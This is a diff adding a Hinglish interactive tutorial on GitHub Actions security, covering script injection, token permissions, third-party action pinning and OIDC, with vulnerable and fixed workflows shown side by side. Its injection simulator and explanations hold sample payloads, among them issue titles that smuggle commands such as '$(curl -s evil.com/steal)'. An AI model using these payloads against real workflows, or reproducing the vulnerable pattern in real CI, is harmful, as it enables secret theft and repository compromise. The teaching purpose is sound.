+      <button class="nav-btn" data-tab="fork-hardening" onclick="switchTab('fork-hardening')">
+        <span class="nav-icon">🏰</span> 6. Fork PRs, Envs &amp; Runners
+      </button>
+      <button class="nav-btn" data-tab="audit-quiz" onclick="switchTab('audit-quiz')">
+        <span class="nav-icon">🎯</span> 7. Audit Checklist &amp; Quiz
+      </button>
+
+      <div class="nav-progress">
+        <div style="display:flex; justify-content:space-between;">
+          <span>Progress</span>
+          <span id="progress-label">1 / 7</span>
+        </div>
+        <div class="progress-bar-track">
+          <div class="progress-bar-fill" id="progress-fill"></div>
+        </div>
+      </div>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-content">
+
+      <!-- =============================================================== -->
+      <!-- TAB 1: BIG PICTURE & 3 PILLARS                                  -->
+      <!-- =============================================================== -->
+      <section id="big-picture" class="tab-content active">
+        <div class="card card-red">
+          <span class="hinglish-tag tag-red">Sabse Pehle — Danger Ka Feel Lo!</span>
+          <h2 class="card-title">🚨 CI/CD Workflows Hackers Ka Favourite Target Kyun Hain?</h2>
+          <p class="intro-text">
+            Zara socho: tumhare GitHub Actions workflows ke paas kya-kya hota hai?
+            <br>🔥 Tumhara <strong>poora source code</strong>,
+            <br>🔥 Tumhare <strong>AWS / Cloud / Database secrets</strong>,
+            <br>🔥 Tumhare <strong>production server pe deploy karne ka power</strong>,
+            <br>🔥 Aur ek automatic <strong><code>GITHUB_TOKEN</code></strong> jo tumhare repo pe push ya issues edit kar sakta hai!
+          </p>
+          <p class="intro-text">
+            Aur twist ye hai: <strong>bahar ka koi bhi stranger</strong> tumhare public repo par ek <strong>GitHub Issue open</strong> karke ya <strong>Pull Request bhej</strong> ke tumhara workflow trigger kar sakta hai! Agar workflow secure nahi hai, toh us stranger ka code tumhare runner VM par chal sakta hai!
+          </p>
+
+          <div class="analogy-box danger">
+            <div class="analogy-title">🏦 Real-Life Analogy: Bank Locker ka Robot!</div>
+            Tumhara GitHub Actions Runner ek <strong>super-powerful robot</strong> hai jiske haath mein tumhare AWS account, production server, aur GitHub repo ki chabiyan hain.<br>
+            Security ka matlab sirf ek hi cheez hai: <strong>Ensure karna ki koi bahar wala insaan (ya shady third-party plugin) is robot ko galat order na de paaye, aur robot ke paas sirf utni hi chabiyan hon jitni us kaam ke liye zaroori hain!</strong>
+          </div>
+        </div>
+
+        <div class="card card-purple">
+          <span class="hinglish-tag tag-purple">Tumhare Slide Ke Exact 3 Pillars!</span>
+          <h2 class="card-title">🎭 3 Major GitHub Actions Security Risks (Click Karke Deep Dive Karo!)</h2>
+          <p class="intro-text">
+            Poora Section 09 inhi 3 main threats + OIDC/hardening ke around ghoomta hai:
+          </p>
+
+          <div class="grid-3">
+            <!-- Card 1 -->
+            <div class="type-card t-inj" onclick="switchTab('script-injection')">
+              <div class="type-icon">💉</div>
+              <h3>Script Injection</h3>
+              <ul class="type-pill-list">
+                <li>Bahar se aayi hui untrusted value (e.g. Issue title, PR title) seedha workflow mein use hoti hai</li>
+                <li>Example: <code>${{ github.event.issue.title }}</code> directly bash <code>run:</code> mein daal dena</li>
+                <li>Attacker apna shell command inject karke workflow behavior hijack kar sakta hai!</li>
+              </ul>
+              <span class="type-cta">Live Hack &amp; Fix Dekho →</span>
+            </div>
+
+            <!-- Card 2 -->
+            <div class="type-card t-third" onclick="switchTab('third-party')">
+              <div class="type-icon">🎬</div>
+              <h3>Malicious Third-Party Actions</h3>
+              <ul class="type-pill-list">
+                <li>Koi bhi external Action tumhare runner pe <strong>kuch bhi</strong> logic chal sakta hai</li>
+                <li>Example: Ek fake/hijacked 3rd-party Action jo tumhare secrets padh ke hacker ke server pe bhej de</li>
+                <li>Fix: Trusted authors use karo, code inspect karo, aur <strong>Commit SHA</strong> pe pin karo!</li>
+              </ul>
+              <span class="type-cta">SHA Pinning &amp; Defense Dekho →</span>
+            </div>
+
+            <!-- Card 3 -->
+            <div class="type-card t-perm" onclick="switchTab('permissions')">
+              <div class="type-icon">🔑</div>
+              <h3>Permission Issues</h3>
+              <ul class="type-pill-list">
+                <li>Overly permissive default <code>GITHUB_TOKEN</code> permissions avoid karo!</li>
+                <li>Example: Sirf code checkout karna hai toh <code>contents: read</code> do — <code>write</code> kyun?</li>
+                <li>GitHub Actions fine-grained <code>permissions:</code> control deta hai per workflow &amp; per job!</li>
+              </ul>
+              <span class="type-cta">Permissions Simulator Dekho →</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <span class="hinglish-tag">Tumhare 09 Security Folder Ka Map</span>
+          <h2 class="card-title">📂 Project Files (Starting vs Finished)</h2>
+          <div class="folder-tree"><span class="tree-dir">09 Security/</span>
+├── <span class="tree-dir">01 Starting Project/.github/workflows/</span>
+│   ├── <span class="tree-file">script-injection.yml</span>     <span class="tree-tag t-red">❌ Vulnerable to Bash Injection!</span>
+│   └── <span class="tree-file">label-issues-real.yml</span>    <span class="tree-tag t-red">❌ Missing explicit permissions!</span>
+└── <span class="tree-dir">02 Finished Project/.github/workflows/</span>
+    ├── <span class="tree-file">script-injection.yml</span>     <span class="tree-tag t-green">✅ Fixed via env: TITLE!</span>
+    └── <span class="tree-file">label-issues-real.yml</span>    <span class="tree-tag t-green">✅ Fixed via permissions: issues: write!</span></div>
+        </div>
+
+        <div class="section-footer-nav">
+          <div></div>
+          <button class="pager-btn primary" onclick="switchTab('script-injection')">Next: Script Injection + Live Hack Lab →</button>
+        </div>
+      </section>
+
+      <!-- =============================================================== -->
+      <!-- TAB 2: SCRIPT INJECTION                                         -->
+      <!-- =============================================================== -->
+      <section id="script-injection" class="tab-content">
+        <div class="card card-red">
+          <span class="hinglish-tag tag-red">Threat #1 · Sabse Khatarnaak &amp; Common Bug!</span>
+          <h2 class="card-title">💉 Script Injection Kya Hai? (Exact Project Code!)</h2>
+          <p class="intro-text">
+            Apne <code>01 Starting Project/.github/workflows/script-injection.yml</code> ko dhyan se dekho. Ye workflow har naye GitHub Issue ke khulne par check karta hai ki kya issue title mein <code>"bug"</code> word hai.
+            <br>Dekhne mein bilkul innocent lagta hai... <strong>PAR LINE 12 EK TIME BOMB HAI! 💣</strong>
+          </p>
+
+          <div class="sub-tabs">
+            <button class="sub-tab-btn active" onclick="switchSubTab(this, 'si-before')">❌ Vulnerable (01 Starting Project)</button>
+            <button class="sub-tab-btn" onclick="switchSubTab(this, 'si-after')">✅ Secure Fix (02 Finished Project)</button>
+          </div>
+
+          <div id="si-before" class="sub-panel active">
+            <div class="code-wrapper">
+              <div class="code-header">
+                <div class="code-filepath"><span class="code-dots"><span></span><span></span><span></span></span>01 Starting Project/.github/workflows/script-injection.yml</div>
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+              </div>
+              <pre><code><span class="y-key">name</span>: <span class="y-str">Label Issues (Script Injection Example)</span>
+<span class="y-key">on</span>:
+  <span class="y-key">issues</span>:
+    <span class="y-key">types</span>:
+      - <span class="y-str">opened</span>
+<span class="y-key">jobs</span>:
+  <span class="y-key">assign-label</span>:
+    <span class="y-key">runs-on</span>: <span class="y-str">ubuntu-latest</span>
+    <span class="y-key">steps</span>:
+      - <span class="y-key">name</span>: <span class="y-str">Assign label</span>
+        <span class="y-key">run</span>: |
+<span class="y-hl-red">          issue_title="<span class="y-expr">${{ github.event.issue.title }}</span>"   <span class="y-com"># 💣 DANGER! Direct expression inside bash!</span></span>
+          if [[ "$issue_title" == *"bug"* ]]; then
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi</code></pre>
+            </div>
+          </div>
+
+          <div id="si-after" class="sub-panel">
+            <div class="code-wrapper">
+              <div class="code-header">
+                <div class="code-filepath"><span class="code-dots"><span></span><span></span><span></span></span>02 Finished Project/.github/workflows/script-injection.yml</div>
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+              </div>
+              <pre><code><span class="y-key">name</span>: <span class="y-str">Label Issues (Script Injection Example)</span>
+<span class="y-key">on</span>:
+  <span class="y-key">issues</span>:
+    <span class="y-key">types</span>:
+      - <span class="y-str">opened</span>
+<span class="y-key">jobs</span>:
+  <span class="y-key">assign-label</span>:
+    <span class="y-key">runs-on</span>: <span class="y-str">ubuntu-latest</span>
+    <span class="y-key">steps</span>:
+      - <span class="y-key">name</span>: <span class="y-str">Assign label</span>
+<span class="y-hl-green">        <span class="y-key">env</span>:
+          <span class="y-key">TITLE</span>: <span class="y-expr">${{ github.event.issue.title }}</span>  <span class="y-com"># 🛡️ SAFE! Passed via OS env var, NOT bash text!</span></span>
+        <span class="y-key">run</span>: |
+<span class="y-hl-green">          if [[ "$TITLE" == *"bug"* ]]; then          <span class="y-com"># 🛡️ Bash reads "$TITLE" purely as DATA!</span></span>
+          echo "Issue is about a bug!"
+          else
+          echo "Issue is not about a bug"
+          fi</code></pre>
+            </div>
+          </div>
+
+          <div class="analogy-box purple">
+            <div class="analogy-title">🤯 WHY Does <code>${{ ... }}</code> Break, While <code>env: TITLE</code> Fixes It?! (Real Feel!)</div>
+            <strong>Vulnerable case mein:</strong> GitHub Actions bash chalane se PEHLE ek dumb <strong>Find-and-Replace (Copy-Paste)</strong> karta hai! Wo <code>${{ github.event.issue.title }}</code> ko literally issue ke text se replace karke ek <code>.sh</code> file banata hai aur bash ko de deta hai. Agar title mein <code>"; curl evil.com #</code> hai, toh bash ko lagta hai ki <strong>workflow author ne khud 2 commands likhe hain!</strong> (Bilkul SQL Injection jaisa!)<br><br>
+            <strong>Safe <code>env:</code> case mein:</strong> GitHub title ko script file mein paste NAHI karta — wo usse Linux OS ke <strong>memory (environment variable <code>TITLE</code>)</strong> mein rakh deta hai! Jab bash <code>"$TITLE"</code> padhta hai, wo use sirf ek plain text string (DATA) maanta hai, kabhi CODE ki tarah execute nahi karta!
+          </div>
+        </div>
+
+        <!-- LIVE HACKER ATTACK SIMULATOR -->
+        <div class="card card-green">
+          <span class="hinglish-tag tag-green">Interactive Attack &amp; Defense Lab · Feel Guarantee!</span>
+          <h2 class="card-title">🎮 Live Script Injection Simulator: Khud Hack Karke Dekho!</h2>
+          <p class="intro-text">
+            Niche ek attacker ka Issue Title select karo (ya khud type karo!), aur toggle karo <strong>❌ Vulnerable</strong> vs <strong>✅ Safe (<code>env: TITLE</code>)</strong> — real time mein dekho bash ko kya script milti hai aur kya execute hota hai!
+          </p>
+
+          <div class="sim-box">
+            <div class="sim-controls">
+              <div class="sim-group">
+                <span class="sim-label">Workflow Version:</span>
+                <button class="sim-toggle active-red" id="inj-mode-vuln" onclick="setInjMode('vuln')">❌ Vulnerable (01 Starting)</button>
+                <button class="sim-toggle" id="inj-mode-safe" onclick="setInjMode('safe')">✅ Fixed with env: (02 Finished)</button>
+              </div>
+              <div class="sim-group">
+                <span class="sim-label">Preset Payloads:</span>
+                <button class="sim-toggle" onclick="setInjPayload('Login button bug')">😇 Normal Title</button>
+                <button class="sim-toggle active-amber" onclick="setInjPayload('bug&quot;; echo &quot;💀 PWNED! Stealing AWS_SECRET...&quot;; #')">💀 Command Injection</button>
+                <button class="sim-toggle" onclick="setInjPayload('$(curl -s evil.com/steal) bug')">💣 Subshell $() Attack</button>
+              </div>
+            </div>
+
+            <label class="sim-label" style="display:block; margin-bottom:0.4rem;">Attacker's GitHub Issue Title (<code>github.event.issue.title</code>) — editable:</label>
+            <input type="text" class="sim-input" id="inj-input" value='bug"; echo "💀 PWNED! Stealing AWS_SECRET..."; #' oninput="renderInjSim()">
+
+            <div class="pipeline-visual" style="margin: 0.8rem 0;">
+              <div class="pipeline-step" id="inj-step-script">
+                <div class="step-number" id="inj-s1-num">1</div>
+                <div class="step-details">
+                  <h4>Exact Bash Script Generated by GitHub Runner</h4>
+                  <pre id="inj-generated-script" style="background:#04070d; border-radius:8px; padding:0.75rem 1rem; margin-top:0.5rem; font-size:0.8rem;"></pre>
+                </div>
+              </div>
+            </div>
+
+            <div class="sim-terminal" id="inj-terminal"></div>
+          </div>
+        </div>
+
+        <!-- Untrusted Inputs + All 3 Defenses -->
+        <div class="card card-amber">
+          <span class="hinglish-tag tag-amber">Never Trust User-Controlled Contexts!</span>
+          <h2 class="card-title">⚠️ Kaunse <code>github.*</code> Inputs Dangerous Hain + 3 Safe Ways</h2>
+          <div class="grid-2">
+            <div class="mini-box" style="border-color: rgba(239, 68, 68, 0.35);">
+              <h4>☠️ High-Risk (Untrusted) Inputs</h4>
+              <ul>
+                <li><code>github.event.issue.title</code> &amp; <code>.body</code></li>
+                <li><code>github.event.pull_request.title</code> &amp; <code>.body</code></li>
+                <li><code>github.event.comment.body</code></li>
+                <li><code>github.event.review.body</code></li>
+                <li><code>github.head_ref</code> (Attacker PR branch ka naam hi <code>bug";curl...</code> rakh sakta hai!)</li>
+                <li><code>github.event.commits[*].message</code></li>
+              </ul>
+            </div>
+            <div class="mini-box" style="border-color: rgba(16, 185, 129, 0.38);">
+              <h4>🛡️ 3 Golden Defenses Against Injection</h4>
+              <ul>
+                <li><strong>1. Intermediate <code>env:</code> Variable (Best for <code>run:</code>):</strong> <code>env: TITLE: ${{ ... }}</code> aur bash mein <code>"$TITLE"</code> (quotes zaroori!).</li>
+                <li><strong>2. Workflow <code>if:</code> Expression:</strong> Jaise <code>label-issues-real.yml</code> mein: <code>if: contains(github.event.issue.title, 'bug')</code> — ye bash mein nahi, GitHub ke safe expression engine mein evaluate hota hai!</li>
+                <li><strong>3. JavaScript Action:</strong> Input ko <code>with:</code> mein bhejo aur <code>core.getInput()</code> se Node mein handle karo — zero shell parsing!</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-footer-nav">
+          <button class="pager-btn" onclick="switchTab('big-picture')">← Previous: 3 Pillars</button>
+          <button class="pager-btn primary" onclick="switchTab('permissions')">Next: GITHUB_TOKEN &amp; Permissions →</button>
+        </div>
+      </section>
+
+      <!-- =============================================================== -->
+      <!-- TAB 3: GITHUB_TOKEN & PERMISSIONS                               -->
+      <!-- =============================================================== -->
+      <section id="permissions" class="tab-content">
+        <div class="card card-purple">
+          <span class="hinglish-tag tag-pink">Threat #2 · Least Privilege Principle</span>
+          <h2 class="card-title">🔑 <code>GITHUB_TOKEN</code> &amp; Fine-Grained Permissions</h2>
+          <p class="intro-text">
+            Pehle ek basic baat samjho: <strong><code>secrets.GITHUB_TOKEN</code> kahan se aata hai?</strong> Tumne ise Settings → Secrets mein add nahi kiya!
+            <br>GitHub har workflow run ke start hone par <strong>automatically ek temporary token generate</strong> karta hai, aur job khatam hote hi usse expire kar deta hai! Iski madad se tumhara workflow GitHub API call kar sakta hai (code checkout karna, PR comment karna, issue pe label lagana).
+          </p>
+
+          <div class="analogy-box">
+            <div class="analogy-title">🏨 Hotel Keycard Analogy (Least Privilege!)</div>
+            Socho tumne ek cleaner ko sirf <strong>Room 101</strong> saaf karne bheja. Kya tum use poore hotel ki <strong>Master Key</strong> (jisse vault, reception aur saare rooms khul jaayein) doge? <strong>NAHI!</strong> Sirf Room 101 ka keycard doge!<br><br>
+            Bilkul waise hi: <code>label-issues-real.yml</code> ko sirf <strong>issues pe label lagana hai</strong> — use code push (<code>contents: write</code>) ya packages delete (<code>packages: write</code>) karne ki permission kyun deni?!
+          </div>
+
+          <div class="sub-tabs">
+            <button class="sub-tab-btn active" onclick="switchSubTab(this, 'perm-before')">❌ Before (01 Starting Project)</button>
+            <button class="sub-tab-btn" onclick="switchSubTab(this, 'perm-after')">✅ After (02 Finished Project)</button>
+          </div>
+
+          <div id="perm-before" class="sub-panel active">
+            <div class="code-wrapper">
+              <div class="code-header">
+                <div class="code-filepath"><span class="code-dots"><span></span><span></span><span></span></span>01 Starting Project/.github/workflows/label-issues-real.yml</div>
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+              </div>
+              <pre><code><span class="y-key">name</span>: <span class="y-str">Label Issues (Permissions Example)</span>
+<span class="y-key">on</span>:
+  <span class="y-key">issues</span>:
+    <span class="y-key">types</span>: [ <span class="y-str">opened</span> ]
+<span class="y-key">jobs</span>:
+  <span class="y-key">assign-label</span>:
+    <span class="y-com"># ⚠️ Koi 'permissions:' block nahi hai → Repo ke default permissions pe depend karta hai!</span>
+    <span class="y-com"># Agar Repo setting "Read-Only" hai toh curl POST 403 Forbidden fail hoga!</span>
+    <span class="y-com"># Agar Repo setting "Read &amp; Write" hai toh token ko OVER-PERMISSIVE power mil jaayegi!</span>
+    <span class="y-key">runs-on</span>: <span class="y-str">ubuntu-latest</span>
+    <span class="y-key">steps</span>:
+      - <span class="y-key">name</span>: <span class="y-str">Assign label</span>
+        <span class="y-key">if</span>: <span class="y-expr">contains(github.event.issue.title, 'bug')</span>
+        <span class="y-key">run</span>: |
+          curl -X POST \
+          --url https://api.github.com/repos/<span class="y-expr">${{ github.repository }}</span>/issues/<span class="y-expr">${{ github.event.issue.number }}</span>/labels \
+          -H 'authorization: Bearer <span class="y-expr">${{ secrets.GITHUB_TOKEN }}</span>' \
+          -H 'content-type: application/json' \
+          -d '{ "labels": ["bug"] }' \
+          --fail</code></pre>
+            </div>
+          </div>
+
+          <div id="perm-after" class="sub-panel">
+            <div class="code-wrapper">
+              <div class="code-header">
+                <div class="code-filepath"><span class="code-dots"><span></span><span></span><span></span></span>02 Finished Project/.github/workflows/label-issues-real.yml</div>
+                <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+              </div>
+              <pre><code><span class="y-key">name</span>: <span class="y-str">Label Issues (Permissions Example)</span>
+<span class="y-key">on</span>:
+  <span class="y-key">issues</span>:
+    <span class="y-key">types</span>: [ <span class="y-str">opened</span> ]
+<span class="y-key">jobs</span>:
+  <span class="y-key">assign-label</span>:
+<span class="y-hl-green">    <span class="y-key">permissions</span>:
+      <span class="y-key">issues</span>: <span class="y-str">write</span>   <span class="y-com"># 🎯 SIRF issues write! Baaki SAB (contents, PRs, packages) auto 'none'!</span></span>
+    <span class="y-key">runs-on</span>: <span class="y-str">ubuntu-latest</span>
+    <span class="y-key">steps</span>:
+      - <span class="y-key">name</span>: <span class="y-str">Assign label</span>
+        <span class="y-key">if</span>: <span class="y-expr">contains(github.event.issue.title, 'bug')</span>  <span class="y-com"># 🛡️ Safe from script injection too!</span>
+        <span class="y-key">run</span>: |
+          curl -X POST \
+          --url https://api.github.com/repos/<span class="y-expr">${{ github.repository }}</span>/issues/<span class="y-expr">${{ github.event.issue.number }}</span>/labels \
+          -H 'authorization: Bearer <span class="y-expr">${{ secrets.GITHUB_TOKEN }}</span>' \
+          -H 'content-type: application/json' \
+          -d '{ "labels": ["bug"] }' \
+          --fail</code></pre>
+            </div>
+          </div>
+
+          <div class="analogy-box warn">
+            <div class="analogy-title">🔥 SUPER IMPORTANT RULE: Implicit Deny!</div>
+            Jaise hi tum workflow ya job mein <code>permissions:</code> block add karte ho (chahe sirf <code>issues: write</code> likho), <strong>baaki SAARE unlisted scopes automatically <code>none</code> ban jaate hain!</strong><br>
+            Example: Agar isi job mein baad mein <code>actions/checkout@v4</code> bhi chalana pade, toh tumhe <code>contents: read</code> bhi explicitly add karna padega (warna checkout fail ho jaayega!).<br>
+            <strong>2-Step Best Practice:</strong> Repo Settings → Actions → General → Workflow permissions ko <strong>"Read repository contents and packages"</strong> pe set karo, AND har workflow/job mein exact <code>permissions:</code> declare karo!
+          </div>
+        </div>
+
+        <!-- LIVE PERMISSIONS SIMULATOR -->
+        <div class="card card-green">
+          <span class="hinglish-tag tag-green">Interactive Simulator · Blast Radius Feel!</span>
+          <h2 class="card-title">🎮 Live <code>GITHUB_TOKEN</code> Permissions Simulator</h2>
+          <p class="intro-text">
+            Repo Default Setting aur Job ka <code>permissions:</code> block toggle karo, aur dekho <code>label-issues-real.yml</code> ka curl call + ek hypothetical hacked step kya kar paayega!
+          </p>
+
+          <div class="sim-box">
+            <div class="sim-controls">
+              <div class="sim-group">
+                <span class="sim-label">Repo Default Setting:</span>
+                <button class="sim-toggle active-green" id="perm-repo-ro" onclick="setPermSim('repo', 'read-only')">🔒 Read-Only (Recommended)</button>
+                <button class="sim-toggle" id="perm-repo-rw" onclick="setPermSim('repo', 'read-write')">⚠️ Read &amp; Write (Old Default)</button>
+              </div>
+              <div class="sim-group">
+                <span class="sim-label">Job <code>permissions:</code> Block:</span>
+                <button class="sim-toggle active" id="perm-job-none" onclick="setPermSim('job', 'unset')">Not Set (01 Starting)</button>
+                <button class="sim-toggle" id="perm-job-issues" onclick="setPermSim('job', 'issues-write')">issues: write (02 Finished)</button>
+                <button class="sim-toggle" id="perm-job-both" onclick="setPermSim('job', 'issues-and-contents')">issues: write + contents: read</button>
+              </div>
+            </div>
+
+            <div class="pipeline-visual" style="margin: 0.75rem 0;">
+              <div class="pipeline-step" id="perm-res-label">
+                <div class="step-number">1</div>
+                <div class="step-details">
+                  <h4><code>curl POST /issues/42/labels</code> (Add "bug" label)</h4>
+                  <p id="perm-res-label-desc"></p>
+                </div>
+                <div class="step-badge" id="perm-res-label-badge"></div>
+              </div>
+              <div class="pipeline-step" id="perm-res-checkout">
+                <div class="step-number purple">2</div>
+                <div class="step-details">
+                  <h4><code>actions/checkout</code> (Read Repo Code)</h4>
+                  <p id="perm-res-checkout-desc"></p>
+                </div>
+                <div class="step-badge" id="perm-res-checkout-badge"></div>
+              </div>
+              <div class="pipeline-step" id="perm-res-hack">
+                <div class="step-number red">3</div>
+                <div class="step-details">
+                  <h4>☠️ If Compromised: <code>git push</code> Malicious Code to <code>main</code></h4>
+                  <p id="perm-res-hack-desc"></p>
+                </div>
+                <div class="step-badge" id="perm-res-hack-badge"></div>
+              </div>
+            </div>
+
+            <div class="sim-terminal" id="perm-terminal"></div>
+          </div>
+        </div>
+
+        <!-- Permissions Scopes Cheat Sheet -->
+        <div class="card card-cyan">
+          <span class="hinglish-tag tag-cyan">Quick Reference</span>
+          <h2 class="card-title">📋 Common <code>permissions:</code> Scopes &amp; Levels</h2>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Scope</th>
+                  <th>Values</th>
+                  <th>Kab Chahiye Hota Hai?</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr><td><code>contents</code></td><td><code>read</code> / <code>write</code> / <code>none</code></td><td><code>read</code> = <code>actions/checkout</code>; <code>write</code> = push commits, create tags/releases</td></tr>
+                <tr><td><code>issues</code></td><td><code>read</code> / <code>write</code> / <code>none</code></td><td><code>write</code> = label lagana (<code>label-issues-real.yml</code>), issue comment/close karna</td></tr>
+                <tr><td><code>pull-requests</code></td><td><code>read</code> / <code>write</code> / <code>none</code></td><td><code>write</code> = PR pe automated comment, review, ya label dalna</td></tr>
+                <tr><td><code>packages</code></td><td><code>read</code> / <code>write</code> / <code>none</code></td><td><code>write</code> = Docker images / npm packages ko GitHub Packages (GHCR) pe push karna</td></tr>
+                <tr><td><code>id-token</code></td><td><code>write</code> / <code>none</code></td><td><code>write</code> = <strong>OpenID Connect (OIDC)</strong> se AWS/GCP/Azure mein bina static keys login karna!</td></tr>
+                <tr><td><code>permissions: {}</code></td><td>Empty object</td><td>Zero permissions — jab job ko GitHub API / repo bilkul touch nahi karna!</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="section-footer-nav">
+          <button class="pager-btn" onclick="switchTab('script-injection')">← Previous: Script Injection</button>
+          <button class="pager-btn primary" onclick="switchTab('third-party')">Next: Malicious 3rd-Party Actions →</button>
+        </div>
+      </section>
+
+      <!-- =============================================================== -->
+      <!-- TAB 4: MALICIOUS THIRD-PARTY ACTIONS                            -->
+      <!-- =============================================================== -->
+      <section id="third-party" class="tab-content">
+        <div class="card card-red">
+          <span class="hinglish-tag tag-red">Threat #3 · Supply Chain Attack!</span>
+          <h2 class="card-title">🎬 Malicious Third-Party Actions Kaise Hack Karte Hain?</h2>
+          <p class="intro-text">
+            GitHub Marketplace pe 20,000+ community actions hain. Jab tum likhte ho <code>uses: some-random-dev/cool-action@v1</code>, toh tum literally <strong>kisi anjaan insaan ka JavaScript ya Docker code apne runner VM par run karne ki ijaazat de rahe ho!</strong>
+          </p>
+
+          <div class="pipeline-visual">
+            <div class="pipeline-step">
+              <div class="step-number">1</div>
+              <div class="step-details">
+                <h4>Month 1: Action Bilkul Innocent Hai</h4>
+                <p>Tumne <code>some-dev/super-linter@v1</code> ka code padha — clean laga, workflow mein add kar diya.</p>
+              </div>
+              <div class="step-badge green">@v1 → commit a1b2c3</div>
+            </div>
+            <div class="pipeline-arrow">▼</div>
+            <div class="pipeline-step step-danger">
+              <div class="step-number red">2</div>
+              <div class="step-details">
+                <h4>Month 6: Hacker Steals Author's Account &amp; Moves the <code>v1</code> Tag!</h4>
+                <p>Git tags (jaise <code>v1</code>, <code>v2</code>) <strong>MUTABLE</strong> hote hain! Hacker ek evil commit push karta hai (jo <code>process.env</code> aur repo secrets bahar bhejta hai) aur <code>git tag -f v1</code> chala deta hai!</p>
+              </div>
+              <div class="step-badge red">@v1 → EVIL commit f9e8d7 💀</div>
+            </div>
+            <div class="pipeline-arrow">▼</div>
+            <div class="pipeline-step step-danger">
+              <div class="step-number red">3</div>
+              <div class="step-details">
+                <h4>Tumhara Next Workflow Run Automatically Evil Code Chalata Hai!</h4>
+                <p>Tumne apni YAML file touch bhi nahi ki — fir bhi <code>@v1</code> ab hacker ka naya commit download karke tumhare secrets chura leta hai!</p>
+              </div>
+              <div class="step-badge red">SECRETS STOLEN!</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- INTERACTIVE TAG VS SHA PINNING SIMULATOR -->
+        <div class="card card-green">
+          <span class="hinglish-tag tag-green">Interactive Demo · Mutable Tag vs Immutable SHA</span>
+          <h2 class="card-title">🎮 Live Simulator: Tag Hijack vs Commit SHA Pinning!</h2>
+          <p class="intro-text">
+            Dekho kya hota hai jab kisi 3rd-party action ka author account compromise ho jaaye aur hacker <code>v1</code> tag move kar de:
+          </p>
+
+          <div class="sim-box">
+            <div class="sim-controls">
+              <span class="sim-label">Tumne Workflow Mein Action Kaise Pin Kiya Hai?</span>
+              <button class="sim-toggle active-red" id="pin-btn-branch" onclick="setPinMode('branch')">☠️ @main (Branch)</button>
+              <button class="sim-toggle" id="pin-btn-tag" onclick="setPinMode('tag')">⚠️ @v1 (Version Tag)</button>
+              <button class="sim-toggle" id="pin-btn-sha" onclick="setPinMode('sha')">🛡️ @a1b2c3... (Full Commit SHA)</button>
+            </div>
+
+            <div class="code-wrapper" style="margin-top:0;">
+              <div class="code-header">
+                <div class="code-filepath"><span class="code-dots"><span></span><span></span><span></span></span>.github/workflows/ci.yml</div>
+                <span class="step-badge" id="pin-badge"></span>
+              </div>
+              <pre id="pin-code"></pre>
+            </div>
+
+            <div class="sim-terminal" id="pin-terminal"></div>
+          </div>
+        </div>
+
+        <!-- 4 Defenses against 3rd Party Actions -->
+        <div class="card card-purple">
+          <span class="hinglish-tag tag-purple">4-Layer Protection</span>
+          <h2 class="card-title">🛡️ Third-Party Actions Use Karne Ke 4 Golden Rules</h2>
+          <div class="explain-list">
+            <div class="explain-item">
+              <span class="line-pill green">1. Verified First</span>
+              <p>Hamesha official actions (<code>actions/checkout</code>, <code>aws-actions/...</code>) ya GitHub Marketplace pe <strong>Blue Verified Creator badge</strong> wale actions prefer karo. Agar kaam 2 lines ke bash se ho sakta hai, toh 3rd-party action lagao hi mat!</p>
+            </div>
+            <div class="explain-item">
+              <span class="line-pill green">2. Read the Code</span>
+              <p>Unknown author ka action lagane se pehle unke GitHub repo mein jao aur <code>action.yml</code> + <code>main.js</code> / <code>Dockerfile</code> zaroor inspect karo (dekh lo kahin <code>curl</code> / unknown network call toh nahi hai!).</p>
+            </div>
+            <div class="explain-item">
+              <span class="line-pill green">3. Pin to Full Commit SHA</span>
+              <p>Production &amp; sensitive repos mein <code>@v3</code> ke bajaye full 40-char commit SHA use karo: <code>uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1</code>. Git SHA cryptographically immutable hota hai — hacker history badal hi nahi sakta! <em>(Plus Dependabot enable kar do taaki updates PR ke through milte rahein!)</em></p>
+            </div>
+            <div class="explain-item">
+              <span class="line-pill green">4. Repo / Org Allowlist</span>
+              <p>GitHub Repo/Org Settings → Actions → General mein tum restrict kar sakte ho: <em>"Allow only actions created by GitHub + verified creators + specific allowlisted repos"</em>!</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="section-footer-nav">
+          <button class="pager-btn" onclick="switchTab('permissions')">← Previous: Permissions</button>
+          <button class="pager-btn primary" onclick="switchTab('oidc-secrets')">Next: OpenID Connect (OIDC) →</button>
+        </div>
+      </section>
+
+      <!-- =============================================================== -->
+      <!-- TAB 5: OPENID CONNECT (OIDC)                                    -->
+      <!-- =============================================================== -->
+      <section id="oidc-secrets" class="tab-content">
+        <div class="card card-cyan">
+          <span class="hinglish-tag tag-cyan">Modern Cloud Security · Remember Section 08?</span>
+          <h2 class="card-title">🔐 OpenID Connect (OIDC): Bina Static Secrets Cloud Deploy!</h2>
+          <p class="intro-text">
+            Yaad hai Section 08 ke <code>deploy.yml</code> mein lines 91-93 par tumne dekha tha:
+            <code>permissions: id-token: write</code>?! Ab uska poora raaz khulne wala hai!
+          </p>
+
+          <div class="grid-2">
+            <div class="mini-box" style="border-color: rgba(239, 68, 68, 0.35);">
+              <h4>❌ Purana Tarika: Static Long-Lived Secrets</h4>
+              <ul>
+                <li>IAM User banao → <code>AWS_ACCESS_KEY_ID</code> &amp; <code>AWS_SECRET_ACCESS_KEY</code> copy karke GitHub Secrets mein daalo.</li>
+                <li><strong>Problem 1:</strong> Ye keys <strong>hamesha valid</strong> rehti hain! Agar ek baar leak ho gayi, toh hacker jab tak chahe AWS account use kar sakta hai!</li>
+                <li><strong>Problem 2:</strong> Manual key rotation headache (har 90 din mein sab repos mein keys badlo!).</li>
